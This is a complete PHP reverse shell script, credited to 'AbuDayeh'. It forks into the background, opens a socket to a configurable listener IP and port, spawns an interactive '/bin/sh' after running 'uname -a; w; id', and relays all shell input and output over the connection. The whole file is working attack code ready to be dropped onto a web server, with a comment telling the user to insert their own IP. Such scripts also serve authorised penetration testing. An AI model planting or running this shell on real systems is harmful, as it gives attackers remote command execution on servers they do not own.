<?php
// PHP Reverse Shell
// Copyright (C) 2024 e@hotmail.com
// AbuDayeh

set_time_limit(0);
$ip = '127.0.0.1'; // Change this to your IP address
$port = 1234;      // Change this to your port
$shell = 'uname -a; w; id; /bin/sh -i';
$chunk_size = 1400;
$daemon = 0;
$debug = 0;

/**
 * Print a message if not in daemon mode
 * @param string $string
 */
function printit($string)
{
    global $daemon;
    if (!$daemon) {
        echo "$string\n";
    }
}

/**
 * Try to daemonize the process
 * @return bool
 */
function daemonize()
{
    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            printit("ERROR: Can't fork");
            exit(1);
        }
        if ($pid) {
            exit(0); // Parent exits
        }
        if (posix_setsid() == -1) {
            printit("ERROR: Can't setsid()");
            exit(1);
        }
        return true;
    } else {
        printit("WARNING: Failed to daemonize. This is quite common and not fatal.");
        return false;
    }
}

// Daemonize the process if possible
$daemon = daemonize();

chdir("/");
umask(0);

// Open the socket connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Define the descriptors for the process
$descriptorspec = [
    0 => ["pipe", "r"], // stdin
    1 => ["pipe", "w"], // stdout
    2 => ["pipe", "w"]  // stderr
];

// Spawn the shell process
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set the streams to non-blocking mode
foreach ($pipes as $pipe) {
    stream_set_blocking($pipe, 0);
}
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

// Main loop to handle communication
while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = [$sock, $pipes[1], $pipes[2]];
    $num_changed_sockets = stream_select($read_a, $write_a = null, $error_a = null, null);

    if ($num_changed_sockets === false) {
        printit("ERROR: stream_select failed");
        break;
    }

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        $output = fread($pipes[1], $chunk_size);
        fwrite($sock, $output);
    }

    if (in_array($pipes[2], $read_a)) {
        $error_output = fread($pipes[2], $chunk_size);
        fwrite($sock, $error_output);
    }
}

// Clean up
fclose($sock);
foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($process);
